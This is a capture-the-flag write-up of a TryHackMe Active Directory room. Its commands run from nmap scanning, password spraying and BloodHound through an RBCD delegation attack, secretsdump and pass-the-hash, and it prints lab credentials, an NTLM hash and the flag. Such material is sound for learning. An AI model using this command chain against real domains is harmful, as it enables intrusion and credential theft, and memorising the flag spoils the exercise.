
A medium, AD challenge from Junior Penetration Tester path on TryHackMe.

My initial access creds:
`ctf.local\j.smith` : `JSmith@IT2024`

My goal is to grab Administrator flag.

First thing to do a nmap scan: `nmap -A -v -p- -T4 10.113.174.48`
The results:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-21 10:28:39Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-21T10:30:10+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-21T10:29:30+00:00
| ssl-cert: Subject: commonName=DC01.ctf.local
| Issuer: commonName=DC01.ctf.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-19T02:27:27
| Not valid after:  2026-11-18T02:27:27
| MD5:   a5ba:7599:e686:083e:1b02:8393:ea32:dc81
|_SHA-1: 059b:417e:faca:4e2e:5ba0:a4c3:b2c2:52e0:dc7e:2074
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
...
Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-21T10:29:34
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```

Next I listed shares on a smb: `smbclient -L //10.113.174.48 -N`
The results:
```
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Downloads       Disk      File drop share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

I couldn't see what is inside those shares, so I moved on.
Having an initial access in form of user:password, I connected remotely to the machine with `xfreerdp`.
`xfreerdp /v:10.113.174.48 /u:j.smith /p:'JSmith@IT2024' /cert:ignore +clipboard /dynamic-resolution`
After logging in I spotted that `KeePass2` is installed on the machine. So, there must be some passwords there.
Inside I found another pair of credentials: `t.jones:Helpdesk01!`.

Added hostnames to `/etc/hosts` file:
```
10.113.174.48 DC01  
10.113.174.48 DC01.ctf.local  
10.113.174.48 ctf.local
```

I decided to enumerate users on this AD, with `j.smith` account. I used:
`nxc ldap 10.113.174.48 -u 'j.smith' -p 'JSmith@IT2024' -d ctf.local --users`
I successfully discovered users:
```
Administrator
Guest
krbtgt
j.smith
t.jones
r.williams
svc.heldesk
```
I created a file `users.txt` in order to proceed with password spraying.
`nxc smb 10.113.174.48 -u users.txt -p 'Helpdesk01!' --continue-on-success`
I discovered that `r.williams` has the same password as `t.jones` - `Helpdesk01!`.

I logged in as a `r.williams` user - 
`xfreerdp /v:10.113.174.48 /u:r.williams /p:'Helpdesk01!' /cert:ignore +clipboard /dynamic-resolution`, but there was nothing interesting in there.

Next, I used `bloodhound`:
- `bloodhound-start`
- `bloodhound-python -u 't.jones' -p 'Helpdesk01!' -d ctf.local -ns 10.113.174.48 -c All --zip`
I ingested created .zip file into bloodhound. 

From there I searched for `r.williams` user, and followed instruction from `bloodhound`.
- `addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host DC01 -domain-netbios ctf.local 'ctf.local/r.williams:Helpdesk01!'`
- `rbcd.py -dc-ip 10.113.174.48 -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:Helpdesk01!'`
- `getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKERSYSTEM$:Summer2018!'`
- `export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache`
- `secretsdump.py -k -no-pass ctf.local/Administrator@DC01.ctf.local`

The last command allowed me to dump password hash of the administrator.
`Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dfe3378335d43f9764e581b856a662a:::`

And having one of those helped me in logging into a machine with Pass-The-Hash method.
`evil-winrm -i 10.113.174.48 -u Administrator -H 2dfe3378335d43f9764e581b856a662a`

After logging in as Admin:
`type C:\Users\Administrator\Desktop\flag.txt`
And the flag:
`THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}`